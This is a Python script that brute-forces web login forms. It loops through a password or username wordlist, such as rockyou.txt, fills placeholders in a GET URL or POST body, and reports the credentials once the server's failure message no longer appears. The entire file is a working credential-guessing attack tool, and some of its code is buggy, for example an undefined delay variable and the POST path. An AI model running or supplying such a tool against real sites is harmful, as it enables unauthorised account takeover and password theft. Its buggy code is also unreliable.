import pyautogui
import requests
import keyboard
import time
import sys
import os

trys = 0
verbose = False
post = False
wordlist_path = ""
userlist_path = ""
user = ""
password = ""
use_listpass = False
use_listuser = False
requ = ""
unsuc = ""
post_data = ""

use_user = ""
use_pass = ""

temp = []
for po in sys.argv:
    po.replace('"','')
    temp.append(po)
sys.argv = temp

def send(user,pasw,unsuc,requ,post,post_data,verbose):
    userq = requ.replace("-USER-",user).replace("-PASS-",pasw)
    post_data = post_data.replace("-USER-",user).replace("-PASS-",pasw)
    
    if post:
        post_req = []
        values = post_data.split("&")
        for val in values:
            try:
                p1 = val.split("=")[0]
                p2 = val.split("=")[1]
                post_req.append((p1,p2))
            except:
                print("Post request ERROR")
                continue
        resp = requests.post(requ,post_req)
    else:
        resp = requests.get(userq)
    if verbose:
        print(resp.text)
    if unsuc in resp.text:
        return False
    else:
        return True


def info():
    print("-P= : Wordlist path\n-p= : Preset password\n-U= User wordlist path\n-u= : Preset username\n-v : Print out request return\n-post= : set mode to post and add post variables format=(-post='username='-USER-&password=-PASS-)\n-d= : Delay\n-r= Request format (put -USER- in username filed and -PASS- in password field.)\n-c= : If this value is present in the site login was unsuccesful.\nExample: -u=John -P=/usr/share/wordlists/rockyou.txt -r=http://example.com/login.php?u=-USER-&p=-PASS- -c=unsuccesful")

sys.argv.pop(0)
if len(sys.argv) < 1:
    info()
    exit()

if "-U" in sys.argv and "-P" in sys.argv:
    print("Cannot use userlist and passlist at the same time.")
    exit()

for x in sys.argv:
    if "-h" in x:
        info()
        exit()
    if "-v" in x:
        verbose = True
        continue
    if x.startswith("-P="):
        y = x.split("=")
        wordlist_path = y[1]
        use_listpass = True
    elif x.startswith("-U="):
        y = x.split("=")
        userlist_path = y[1]
        use_listuser = True
    elif x.startswith("-post="):
        y = x.split("-post=")
        post_data = y[1]
        post = True
    elif x.startswith("-r="):
        y = x.split("=")
        requ = y[1]
    elif x.startswith("-p="):
        y = x.split("=")
        password = y[1]
    elif x.startswith("-u="):
        y = x.split("=")
        user = y[1]
    elif x.startswith("-c="):
        y = x.split("=")
        unsuc = y[1]
    elif x.startswith("-d="):
        y = x.split("=")
        delay = float(y[1])

    else:
        print("unknown argument: " + x)
        info()
        exit()

while True:
    if use_listpass:
        with open(wordlist_path) as infile:
            for line in infile:
                password = line
                password = password.replace("\n","")
                user = user.replace("\n","")
                os.system("clear")
                trys += 1
                print(f"[{str(trys)}][{user}][{password}]")
                if send(user,password,unsuc,requ,post,post_data,verbose):
                    print(f"Success | Password: {password} | Username: {user} | Trys: {str(trys)}")
                    exit()
                time.sleep(delay)
    elif use_listuser:
        with open(userlist_path) as infile:
            for line in infile:
                user = line
                user = user.replace("\n","")
                password = password.replace("\n","")
                os.system("clear")
                trys += 1
                print(f"[{str(trys)}][{user}][{password}]")
                if send(user,password,unsuc,requ,post,post_data,verbose):
                    print(f"Success | Password: {password} | Username: {user} | Trys: {str(trys)}")
                    exit()
                time.sleep(delay)
    else:
        send(user,password,unsuc,requ,post,post_data,verbose)
    print("Login unsuccesful.")
    break
    